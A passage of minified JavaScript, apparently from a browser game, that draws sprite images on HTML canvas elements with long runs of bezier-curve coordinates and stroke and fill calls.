      a.bezierCurveTo(e * 78.00003051757812, e * 63.03977966308594, e * 78.00003051757812, e * 63.03977966308594, e * 70.00003051757812, e * 63.03977966308594);
      a.closePath();
      ye(a, t[3], t[2], e * 4);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 80.00003051757812, e * 111.6761474609375);
      a.bezierCurveTo(e * 95.00003051757812, e * 97.1761474609375, e * 95.00003051757812, e * 97.1761474609375, e * 110.00003051757812, e * 82.6761474609375);
      a.closePath();
      ye(a, t[3], t[2], e * 8);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 107.00003051757812, e * 76.6761474609375);
      a.bezierCurveTo(e * 111.50003051757812, e * 82.6761474609375, e * 111.50003051757812, e * 82.6761474609375, e * 116.00003051757812, e * 88.6761474609375);
      a.bezierCurveTo(e * 118.50003051757812, e * 81.6761474609375, e * 118.50003051757812, e * 81.6761474609375, e * 121.00003051757812, e * 74.6761474609375);
      a.closePath();
      ye(a, t[3], t[2], e * 4);
      ze(a, e * 77.00003051757812, e * 105.03977966308594, e * 15.556349186104045);
      ye(a, t[3], t[2], e * 4);
      a.save();
      a.translate(e * 77.00003051757812, e * 31.267044067382812);
      a.rotate(0);
      Be(a, e * -6, e * -12.5, e * 12, e * 25, e * 10);
      a.restore();
      ye(a, t[1], t[2], e * 7);
      a.save();
      a.translate(e * 77.00003051757812, e * 13.267044067382812);
      a.rotate(0);
      Be(a, e * -15, e * -10.5, e * 30, e * 21, e * 10);
      a.restore();
      ye(a, t[1], t[2], e * 7);
      return n;
    }
    function un(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 81;
      r.height = e * 77;
      n.translate(0, e * 10);
      n.scale(0.2, 0.2);
      n.translate(0, e * -30);
      if (t == 1) {
        n.beginPath();
        n.lineCap = "round";
        n.lineJoin = "round";
        n.moveTo(e * 36.5, e * 278.0625);
        n.bezierCurveTo(e * 67.5, e * 316.0625, e * 134.5, e * 334.0625, e * 199.5, e * 319.0625);
        n.bezierCurveTo(e * 254.5, e * 304.0625, e * 346.5, e * 270.0625, e * 348.5, e * 237.0625);
        n.bezierCurveTo(e * 359.5, e * 206.0625, e * 318.5, e * 129.0625, e * 262.5, e * 122.0625);
        n.bezierCurveTo(e * 213.5, e * 115.0625, e * 166.5, e * 133.0625, e * 104.5, e * 166.0625);
        n.bezierCurveTo(e * 54.5, e * 194.0625, e * 23.5, e * 241.0625, e * 36.5, e * 277.0625);
        n.closePath();
        ye(n, i[0], i[3], e * 50);
      }
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 36.5, e * 278.0625);
      n.bezierCurveTo(e * 67.5, e * 316.0625, e * 134.5, e * 334.0625, e * 199.5, e * 319.0625);
      n.bezierCurveTo(e * 254.5, e * 304.0625, e * 346.5, e * 270.0625, e * 348.5, e * 237.0625);
      n.bezierCurveTo(e * 359.5, e * 206.0625, e * 318.5, e * 129.0625, e * 262.5, e * 122.0625);
      n.bezierCurveTo(e * 213.5, e * 115.0625, e * 166.5, e * 133.0625, e * 104.5, e * 166.0625);
      n.bezierCurveTo(e * 54.5, e * 194.0625, e * 23.5, e * 241.0625, e * 36.5, e * 277.0625);
      n.closePath();
      ye(n, i[0], i[1], e * 19);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 214.5, e * 124.0625);
      n.bezierCurveTo(e * 242.5, e * 125.0625, e * 272.5, e * 159.0625, e * 283.5, e * 184.0625);
      n.bezierCurveTo(e * 277.5, e * 161.0625, e * 233.5, e * 128.0625, e * 219.5, e * 122.0625);
      n.closePath();
      ye(n, i[0], i[1], e * 19);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 157.5, e * 145.0625);
      n.bezierCurveTo(e * 176.5, e * 148.0625, e * 205.5, e * 176.0625, e * 212.5, e * 197.0625);
      n.bezierCurveTo(e * 205.5, e * 178.0625, e * 177.5, e * 152.0625, e * 156.5, e * 142.0625);
      n.closePath();
      ye(n, i[0], i[1], e * 19);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 103.5, e * 169.0625);
      n.bezierCurveTo(e * 160.5, e * 166.0625, e * 228.5, e * 312.0625, e * 162.5, e * 323.0625);
      n.bezierCurveTo(e * 128.5, e * 330.0625, e * 45.5, e * 312.0625, e * 34.5, e * 268.0625);
      n.bezierCurveTo(e * 30.5, e * 238.0625, e * 44.5, e * 222.0625, e * 52.5, e * 211.0625);
      n.bezierCurveTo(e * 82.5, e * 174.0625, e * 104.5, e * 166.0625, e * 119.5, e * 172.0625);
      n.closePath();
      ye(n, i[2], i[1], e * 19);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 194.5, e * 313.0625);
      n.bezierCurveTo(e * 222.5, e * 306.0625, e * 319.5, e * 271.0625, e * 337.5, e * 241.0625);
      n.bezierCurveTo(e * 274.5, e * 270.0625, e * 216.5, e * 288.0625, e * 199.5, e * 287.0625);
      n.bezierCurveTo(e * 198.5, e * 302.0625, e * 195.5, e * 311.0625, e * 193.5, e * 312.0625);
      n.closePath();
      ye(n, i[1]);
      n.scale(3, 3);
      n.translate(15, e * 10);
      if (t == 1) {
        n.beginPath();
        n.lineCap = "round";
        n.lineJoin = "round";
        n.moveTo(e * 4, e * 32);
        n.bezierCurveTo(e * 19, e * 25, e * 19, e * 25, e * 34, e * 18);
        n.bezierCurveTo(e * 41.5, e * 23.5, e * 41.5, e * 23.5, e * 49, e * 29);
        n.bezierCurveTo(e * 59.5, e * 20, e * 59.5, e * 20, e * 70, e * 11);
        ye(n, undefined, i[3], e * 28);
        n.beginPath();
        n.lineCap = "round";
        n.lineJoin = "round";
        n.moveTo(e * 56, e * 6);
        n.bezierCurveTo(e * 63.5, e * 13.5, e * 63.5, e * 13.5, e * 71, e * 21);
        n.bezierCurveTo(e * 74.5, e * 11.5, e * 74.5, e * 11.5, e * 78, e * 2);
        n.closePath();
        ye(n, i[3], i[3], e * 28);
      }
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 4, e * 32);
      n.bezierCurveTo(e * 19, e * 25, e * 19, e * 25, e * 34, e * 18);
      n.bezierCurveTo(e * 41.5, e * 23.5, e * 41.5, e * 23.5, e * 49, e * 29);
      n.bezierCurveTo(e * 59.5, e * 20, e * 59.5, e * 20, e * 70, e * 11);
      ye(n, undefined, i[1], e * 17);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 56, e * 6);
      n.bezierCurveTo(e * 63.5, e * 13.5, e * 63.5, e * 13.5, e * 71, e * 21);
      n.bezierCurveTo(e * 74.5, e * 11.5, e * 74.5, e * 11.5, e * 78, e * 2);
      n.closePath();
      ye(n, i[1], i[1], e * 17);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 4, e * 32);
      n.bezierCurveTo(e * 19, e * 25, e * 19, e * 25, e * 34, e * 18);
      n.bezierCurveTo(e * 41.5, e * 23.5, e * 41.5, e * 23.5, e * 49, e * 29);
      n.bezierCurveTo(e * 59.5, e * 20, e * 59.5, e * 20, e * 70, e * 11);
      ye(n, undefined, i[2], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 56, e * 6);
      n.bezierCurveTo(e * 63.5, e * 13.5, e * 63.5, e * 13.5, e * 71, e * 21);
      n.bezierCurveTo(e * 74.5, e * 11.5, e * 74.5, e * 11.5, e * 78, e * 2);
      n.closePath();
      ye(n, i[2], i[2], e * 10);
      return r;
    }
    function ln(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 144;
      r.height = e * 280;
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 5, e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 62, e * 103.79999542236328);
      n.bezierCurveTo(e * 62.5, e * 148.79999542236328, e * 62.5, e * 148.79999542236328, e * 63, e * 193.79999542236328);
      n.bezierCurveTo(e * 63, e * 219.79999542236328, e * 47, e * 217.79999542236328, e * 51, e * 230.79999542236328);
      n.bezierCurveTo(e * 62, e * 255.79999542236328, e * 74, e * 260.7999954223633, e * 72, e * 248.79999542236328);
      n.bezierCurveTo(e * 65, e * 226.79999542236328, e * 71, e * 229.79999542236328, e * 76, e * 225.79999542236328);
      n.bezierCurveTo(e * 90, e * 224.79999542236328, e * 89, e * 232.79999542236328, e * 90, e * 243.79999542236328);
      n.bezierCurveTo(e * 95, e * 253.79999542236328, e * 99, e * 249.79999542236328, e * 100, e * 229.79999542236328);
      n.bezierCurveTo(e * 102, e * 213.79999542236328, e * 98, e * 214.79999542236328, e * 90, e * 205.79999542236328);
      n.bezierCurveTo(e * 82, e * 201.79999542236328, e * 82, e * 185.79999542236328, e * 82, e * 114.79999542236328);
      n.bezierCurveTo(e * 80, e * 73, e * 82, e * 68, e * 93, e * 53);
      n.bezierCurveTo(e * 98, e * 37, e * 65, e * 14, e * 74, e * 33);
      n.bezierCurveTo(e * 82, e * 56, e * 77, e * 52, e * 69, e * 54);
      n.bezierCurveTo(e * 55, e * 57, e * 57, e * 53, e * 54, e * 39);
      n.bezierCurveTo(e * 46, e * 20, e * 37, e * 61, e * 50, e * 68);
      n.bezierCurveTo(e * 65, e * 81, e * 60, e * 89, e * 62, e * 102);
      n.closePath();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(e * -5, e * -5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 62, e * 103.79999542236328);
      n.bezierCurveTo(e * 62.5, e * 148.79999542236328, e * 62.5, e * 148.79999542236328, e * 63, e * 193.79999542236328);
      n.bezierCurveTo(e * 63, e * 219.79999542236328, e * 47, e * 217.79999542236328, e * 51, e * 230.79999542236328);
      n.bezierCurveTo(e * 62, e * 255.79999542236328, e * 74, e * 260.7999954223633, e * 72, e * 248.79999542236328);
      n.bezierCurveTo(e * 65, e * 226.79999542236328, e * 71, e * 229.79999542236328, e * 76, e * 225.79999542236328);
      n.bezierCurveTo(e * 90, e * 224.79999542236328, e * 89, e * 232.79999542236328, e * 90, e * 243.79999542236328);
      n.bezierCurveTo(e * 95, e * 253.79999542236328, e * 99, e * 249.79999542236328, e * 100, e * 229.79999542236328);
      n.bezierCurveTo(e * 102, e * 213.79999542236328, e * 98, e * 214.79999542236328, e * 90, e * 205.79999542236328);
      n.bezierCurveTo(e * 82, e * 201.79999542236328, e * 82, e * 185.79999542236328, e * 82, e * 114.79999542236328);
      n.bezierCurveTo(e * 80, e * 73, e * 82, e * 68, e * 93, e * 53);
      n.bezierCurveTo(e * 98, e * 37, e * 65, e * 14, e * 74, e * 33);
      n.bezierCurveTo(e * 82, e * 56, e * 77, e * 52, e * 69, e * 54);
      n.bezierCurveTo(e * 55, e * 57, e * 57, e * 53, e * 54, e * 39);
      n.bezierCurveTo(e * 46, e * 20, e * 37, e * 61, e * 50, e * 68);
      n.bezierCurveTo(e * 65, e * 81, e * 60, e * 89, e * 62, e * 102);
      n.closePath();
      ye(n, t[1], t[2], e * 6);
      return r;
    }
    function On(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 160;
      r.height = e * 161;
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(0, e * 10);
      n.save();
      n.translate(e * 80.5, e * 78);
      Be(n, e * -71.5, e * -71, e * 143, e * 143, e * 10);
      n.restore();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(0, e * -10);
      n.save();
      n.translate(e * 80.5, e * 78);
      Be(n, e * -71.5, e * -71, e * 143, e * 143, e * 10);
      n.restore();
      ye(n, t[1], t[2], e * 6);
      n.save();
      n.translate(e * 80, e * 78.5);
      Be(n, e * -17, e * -72.5, e * 34, e * 145, e * 10);
      n.restore();
      ye(n, t[3], t[4], e * 6);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(0, e * 10);
      n.save();
      n.translate(e * 80, e * 79.5);
      Be(n, e * -73, e * -16.5, e * 145, e * 34, e * 10);
      n.restore();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(0, e * -10);
      n.save();
      n.translate(e * 80, e * 79.5);
      Be(n, e * -73, e * -16.5, e * 145, e * 34, e * 10);
      n.restore();
      ye(n, t[3], t[4], e * 6);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(0, e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 79, e * 71);
      n.bezierCurveTo(e * 90, e * 42, e * 98, e * 36, e * 109, e * 43);
      n.bezierCurveTo(e * 119, e * 47, e * 128, e * 62, e * 107, e * 72);
      n.bezierCurveTo(e * 96, e * 78.5, e * 96, e * 78.5, e * 85, e * 85);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 84, e * 78);
      n.bezierCurveTo(e * 113, e * 82, e * 123, e * 97, e * 115, e * 108);
      n.bezierCurveTo(e * 110, e * 119, e * 98, e * 124, e * 87, e * 107);
      n.bezierCurveTo(e * 81.5, e * 94.5, e * 81.5, e * 94.5, e * 76, e * 82);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 80, e * 73);
      n.bezierCurveTo(e * 64, e * 37, e * 55, e * 34, e * 45, e * 42);
      n.bezierCurveTo(e * 30, e * 54, e * 36, e * 65, e * 51, e * 72);
      n.bezierCurveTo(e * 62.5, e * 77, e * 62.5, e * 77, e * 74, e * 82);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 82, e * 83);
      n.bezierCurveTo(e * 73, e * 107, e * 60, e * 123, e * 47, e * 113);
      n.bezierCurveTo(e * 33, e * 105, e * 33, e * 92, e * 52, e * 85);
      n.bezierCurveTo(e * 74, e * 73, e * 77, e * 76, e * 76, e * 75);
      n.closePath();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(0, e * -10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 79, e * 71);
      n.bezierCurveTo(e * 90, e * 42, e * 98, e * 36, e * 109, e * 43);
      n.bezierCurveTo(e * 119, e * 47, e * 128, e * 62, e * 107, e * 72);
      n.bezierCurveTo(e * 96, e * 78.5, e * 96, e * 78.5, e * 85, e * 85);
      n.closePath();
      ye(n, t[3], t[4], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 84, e * 78);
      n.bezierCurveTo(e * 113, e * 82, e * 123, e * 97, e * 115, e * 108);
      n.bezierCurveTo(e * 110, e * 119, e * 98, e * 124, e * 87, e * 107);
      n.bezierCurveTo(e * 81.5, e * 94.5, e * 81.5, e * 94.5, e * 76, e * 82);
      n.closePath();
      ye(n, t[3], t[4], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 80, e * 73);
      n.bezierCurveTo(e * 64, e * 37, e * 55, e * 34, e * 45, e * 42);
      n.bezierCurveTo(e * 30, e * 54, e * 36, e * 65, e * 51, e * 72);
      n.bezierCurveTo(e * 62.5, e * 77, e * 62.5, e * 77, e * 74, e * 82);
      n.closePath();
      ye(n, t[3], t[4], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 82, e * 83);
      n.bezierCurveTo(e * 73, e * 107, e * 60, e * 123, e * 47, e * 113);
      n.bezierCurveTo(e * 33, e * 105, e * 33, e * 92, e * 52, e * 85);
      n.bezierCurveTo(e * 74, e * 73, e * 77, e * 76, e * 76, e * 75);
      n.closePath();
      ye(n, t[3], t[4], e * 6);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(0, e * 10);
      n.save();
      n.translate(e * 78.5, e * 78);
      Be(n, e * -13.5, e * -14, e * 27, e * 27, e * 6);
      n.restore();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(0, e * -10);
      n.save();
      n.translate(e * 78.5, e * 78);
      Be(n, e * -13.5, e * -14, e * 27, e * 27, e * 6);
      n.restore();
      ye(n, t[3], t[4], e * 6);
      return r;
    }
    function cn(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 372;
      r.height = e * 358;
      n.translate(e * 0, e * 10);
      n.globalAlpha = i ? 0.2 : 1;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 247.00003051757812, e * 115.76704406738281);
      n.bezierCurveTo(e * 305.0000305175781, e * 124.76704406738281, e * 335.0000305175781, e * 112.76704406738281, e * 359.0000305175781, e * 93.76704406738281);
      n.bezierCurveTo(e * 359.5000305175781, e * 113.26704406738281, e * 359.5000305175781, e * 113.26704406738281, e * 360.0000305175781, e * 132.7670440673828);
      n.bezierCurveTo(e * 339.0000305175781, e * 177.7670440673828, e * 281.0000305175781, e * 178.7670440673828, e * 243.00003051757812, e * 183.7670440673828);
      n.bezierCurveTo(e * 214.50003051757812, e * 214.2670440673828, e * 214.50003051757812, e * 214.2670440673828, e * 186.00003051757812, e * 244.7670440673828);
      n.bezierCurveTo(e * 155.00003051757812, e * 214.2670440673828, e * 155.00003051757812, e * 214.2670440673828, e * 124.00003051757812, e * 183.7670440673828);
      n.bezierCurveTo(e * 51.000030517578125, e * 180.7670440673828, e * 21.000030517578125, e * 161.7670440673828, e * 9.000030517578125, e * 129.7670440673828);
      n.bezierCurveTo(e * 8.500030517578125, e * 110.76704406738281, e * 8.500030517578125, e * 110.76704406738281, e * 8.000030517578125, e * 91.76704406738281);
      n.bezierCurveTo(e * 31.000030517578125, e * 112.76704406738281, e * 87.00003051757812, e * 119.76704406738281, e * 116.00003051757812, e * 117.76704406738281);
      n.bezierCurveTo(e * 175.00003051757812, e * 18.767044067382812, e * 170.00003051757812, e * 23.767044067382812, e * 181.00003051757812, e * 14.767044067382812);
      n.bezierCurveTo(e * 199.00003051757812, e * 34.76704406738281, e * 203.00003051757812, e * 54.76704406738281, e * 247.00003051757812, e * 115.76704406738281);
      n.closePath();
      ye(n, t[0], t[0], e * 10);
      n.translate(e * 0, e * -10);
      n.globalAlpha = 1;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 107.00003051757812, e * 54.13069152832031);
      n.bezierCurveTo(e * 106.50003051757812, e * 38.63069152832031, e * 106.50003051757812, e * 38.63069152832031, e * 106.00003051757812, e * 23.130691528320312);
      n.bezierCurveTo(e * 121.50003051757812, e * 38.13069152832031, e * 121.50003051757812, e * 38.13069152832031, e * 137.00003051757812, e * 53.13069152832031);
      n.closePath();
      ye(n, t[2], t[3], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 233.00003051757812, e * 53.6761474609375);
      n.bezierCurveTo(e * 247.00003051757812, e * 37.1761474609375, e * 247.00003051757812, e * 37.1761474609375, e * 261.0000305175781, e * 20.6761474609375);
      n.bezierCurveTo(e * 261.0000305175781, e * 36.1761474609375, e * 261.0000305175781, e * 36.1761474609375, e * 261.0000305175781, e * 51.6761474609375);
      n.closePath();
      ye(n, t[2], t[3], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 293.0000305175781, e * 54.403411865234375);
      n.bezierCurveTo(e * 300.0000305175781, e * 49.903411865234375, e * 300.0000305175781, e * 49.903411865234375, e * 307.0000305175781, e * 45.403411865234375);
      n.bezierCurveTo(e * 307.0000305175781, e * 49.903411865234375, e * 307.0000305175781, e * 49.903411865234375, e * 307.0000305175781, e * 54.403411865234375);
      n.closePath();
      ye(n, t[2], t[3], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 77.00003051757812, e * 54.403411865234375);
      n.bezierCurveTo(e * 70.00003051757812, e * 50.403411865234375, e * 70.00003051757812, e * 50.403411865234375, e * 63.000030517578125, e * 46.403411865234375);
      n.bezierCurveTo(e * 62.500030517578125, e * 50.903411865234375, e * 62.500030517578125, e * 50.903411865234375, e * 62.000030517578125, e * 55.403411865234375);
      n.closePath();
      ye(n, t[2], t[3], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 58.000030517578125, e * 122.3125);
      n.bezierCurveTo(e * 59.500030517578125, e * 97.3125, e * 59.500030517578125, e * 97.3125, e * 61.000030517578125, e * 72.3125);
      n.bezierCurveTo(e * 91.00003051757812, e * 89.3125, e * 91.00003051757812, e * 89.3125, e * 121.00003051757812, e * 106.3125);
      n.closePath();
      ye(n, t[1], t[1], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 310.0000305175781, e * 127.3125);
      n.bezierCurveTo(e * 308.0000305175781, e * 98.3125, e * 308.0000305175781, e * 98.3125, e * 306.0000305175781, e * 69.3125);
      n.bezierCurveTo(e * 274.5000305175781, e * 88.8125, e * 274.5000305175781, e * 88.8125, e * 243.00003051757812, e * 108.3125);
      n.closePath();
      ye(n, t[1], t[1], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 226.00003051757812, e * 87.85795593261719);
      n.bezierCurveTo(e * 243.50003051757812, e * 66.85795593261719, e * 243.50003051757812, e * 66.85795593261719, e * 261.0000305175781, e * 45.85795593261719);
      n.bezierCurveTo(e * 265.0000305175781, e * 83.85795593261719, e * 265.0000305175781, e * 83.85795593261719, e * 269.0000305175781, e * 121.85795593261719);
      n.bezierCurveTo(e * 235.00003051757812, e * 122.85795593261719, e * 233.00003051757812, e * 107.85795593261719, e * 228.00003051757812, e * 90.85795593261719);
      n.closePath();
      ye(n, t[2], t[3], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 105.00003051757812, e * 128.8579559326172);
      n.bezierCurveTo(e * 104.50003051757812, e * 87.85795593261719, e * 104.50003051757812, e * 87.85795593261719, e * 104.00003051757812, e * 46.85795593261719);
      n.bezierCurveTo(e * 126.50003051757812, e * 69.35795593261719, e * 126.50003051757812, e * 69.35795593261719, e * 149.00003051757812, e * 91.85795593261719);
      n.bezierCurveTo(e * 130.00003051757812, e * 123.85795593261719, e * 123.00003051757812, e * 132.8579559326172, e * 107.00003051757812, e * 130.8579559326172);
      n.closePath();
      ye(n, t[1], t[1], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 59.000030517578125, e * 121.85795593261719);
      n.bezierCurveTo(e * 59.500030517578125, e * 99.35795593261719, e * 59.500030517578125, e * 99.35795593261719, e * 60.000030517578125, e * 76.85795593261719);
      n.bezierCurveTo(e * 84.00003051757812, e * 92.35795593261719, e * 84.00003051757812, e * 92.35795593261719, e * 108.00003051757812, e * 107.85795593261719);
      n.bezierCurveTo(e * 106.00003051757812, e * 148.8579559326172, e * 86.00003051757812, e * 148.8579559326172, e * 62.000030517578125, e * 123.85795593261719);
      n.closePath();
      ye(n, t[2], t[3], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 105.00003051757812, e * 132.8579559326172);
      n.bezierCurveTo(e * 104.50003051757812, e * 93.35795593261719, e * 104.50003051757812, e * 93.35795593261719, e * 104.00003051757812, e * 53.85795593261719);
      n.bezierCurveTo(e * 126.50003051757812, e * 75.85795593261719, e * 126.50003051757812, e * 75.85795593261719, e * 149.00003051757812, e * 97.85795593261719);
      n.closePath();
      ye(n, t[2], t[3], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 311.0000305175781, e * 126.85795593261719);
      n.bezierCurveTo(e * 309.0000305175781, e * 101.35795593261719, e * 309.0000305175781, e * 101.35795593261719, e * 307.0000305175781, e * 75.85795593261719);
      n.bezierCurveTo(e * 271.0000305175781, e * 96.85795593261719, e * 271.0000305175781, e * 96.85795593261719, e * 235.00003051757812, e * 117.85795593261719);
      n.closePath();
      ye(n, t[2], t[3], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 228.00003051757812, e * 96.85795593261719);
      n.bezierCurveTo(e * 244.50003051757812, e * 74.85795593261719, e * 244.50003051757812, e * 74.85795593261719, e * 261.0000305175781, e * 52.85795593261719);
      n.bezierCurveTo(e * 265.5000305175781, e * 89.85795593261719, e * 265.5000305175781, e * 89.85795593261719, e * 270.0000305175781, e * 126.85795593261719);
      n.closePath();
      ye(n, t[2], t[3], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 12.000030517578125, e * 86.13069152832031);
      n.bezierCurveTo(e * 36.000030517578125, e * 113.13069152832031, e * 84.00003051757812, e * 111.13069152832031, e * 116.00003051757812, e * 113.13069152832031);
      n.bezierCurveTo(e * 164.00003051757812, e * 23.130691528320312, e * 172.00003051757812, e * 18.130691528320312, e * 181.00003051757812, e * 9.130691528320312);
      n.bezierCurveTo(e * 199.00003051757812, e * 29.130691528320312, e * 221.00003051757812, e * 78.13069152832031, e * 247.00003051757812, e * 112.13069152832031);
      n.bezierCurveTo(e * 301.0000305175781, e * 122.13069152832031, e * 338.0000305175781, e * 111.13069152832031, e * 359.0000305175781, e * 94.13069152832031);
      n.bezierCurveTo(e * 359.0000305175781, e * 113.13069152832031, e * 358.5000305175781, e * 105.13069152832031, e * 358.0000305175781, e * 116.13069152832031);
      n.bezierCurveTo(e * 270.5000305175781, e * 130.1306915283203, e * 270.5000305175781, e * 130.1306915283203, e * 183.00003051757812, e * 144.1306915283203);
      n.bezierCurveTo(e * 98.00003051757812, e * 128.6306915283203, e * 98.00003051757812, e * 128.6306915283203, e * 13.000030517578125, e * 113.13069152832031);
      n.closePath();
      ye(n, t[1], t[1], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 247.00003051757812, e * 115.76704406738281);
      n.bezierCurveTo(e * 305.0000305175781, e * 124.76704406738281, e * 335.0000305175781, e * 112.76704406738281, e * 359.0000305175781, e * 93.76704406738281);
      n.bezierCurveTo(e * 359.5000305175781, e * 113.26704406738281, e * 359.5000305175781, e * 113.26704406738281, e * 360.0000305175781, e * 132.7670440673828);
      n.bezierCurveTo(e * 339.0000305175781, e * 177.7670440673828, e * 281.0000305175781, e * 178.7670440673828, e * 243.00003051757812, e * 183.7670440673828);
      n.bezierCurveTo(e * 214.50003051757812, e * 214.2670440673828, e * 214.50003051757812, e * 214.2670440673828, e * 186.00003051757812, e * 244.7670440673828);
      n.bezierCurveTo(e * 155.00003051757812, e * 214.2670440673828, e * 155.00003051757812, e * 214.2670440673828, e * 124.00003051757812, e * 183.7670440673828);
      n.bezierCurveTo(e * 51.000030517578125, e * 180.7670440673828, e * 21.000030517578125, e * 161.7670440673828, e * 9.000030517578125, e * 129.7670440673828);
      n.bezierCurveTo(e * 8.500030517578125, e * 110.76704406738281, e * 8.500030517578125, e * 110.76704406738281, e * 8.000030517578125, e * 91.76704406738281);
      n.bezierCurveTo(e * 31.000030517578125, e * 112.76704406738281, e * 87.00003051757812, e * 119.76704406738281, e * 116.00003051757812, e * 117.76704406738281);
      n.bezierCurveTo(e * 175.00003051757812, e * 18.767044067382812, e * 170.00003051757812, e * 23.767044067382812, e * 181.00003051757812, e * 14.767044067382812);
      n.bezierCurveTo(e * 199.00003051757812, e * 34.76704406738281, e * 203.00003051757812, e * 54.76704406738281, e * 247.00003051757812, e * 115.76704406738281);
      n.closePath();
      ye(n, t[2], t[3], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 27.000030517578125, e * 94.76704406738281);
      n.bezierCurveTo(e * 11.000030517578125, e * 81.76704406738281, e * 31.000030517578125, e * 72.76704406738281, e * 44.000030517578125, e * 59.76704406738281);
      n.bezierCurveTo(e * 9.000030517578125, e * 65.76704406738281, e * 4.000030517578125, e * 78.76704406738281, e * 9.000030517578125, e * 89.76704406738281);
      n.closePath();
      ye(n, t[2], t[3], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 352.0000305175781, e * 100.76705932617188);
      n.bezierCurveTo(e * 362.0000305175781, e * 92.76705932617188, e * 352.0000305175781, e * 84.76705932617188, e * 340.0000305175781, e * 68.76705932617188);
      n.bezierCurveTo(e * 360.0000305175781, e * 69.76705932617188, e * 364.0000305175781, e * 79.76705932617188, e * 364.0000305175781, e * 94.76705932617188);
      n.closePath();
      ye(n, t[1], t[1], e * 1);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 25.000030517578125, e * 97.94886779785156);
      n.bezierCurveTo(e * 2.000030517578125, e * 76.94886779785156, e * 29.000030517578125, e * 62.94886779785156, e * 44.000030517578125, e * 59.94886779785156);
      n.bezierCurveTo(e * 8.000030517578125, e * 59.94886779785156, e * -0.999969482421875, e * 81.94886779785156, e * 4.000030517578125, e * 92.94886779785156);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 349.0000305175781, e * 100.94886779785156);
      n.bezierCurveTo(e * 366.0000305175781, e * 82.94886779785156, e * 353.0000305175781, e * 76.94886779785156, e * 337.0000305175781, e * 67.94886779785156);
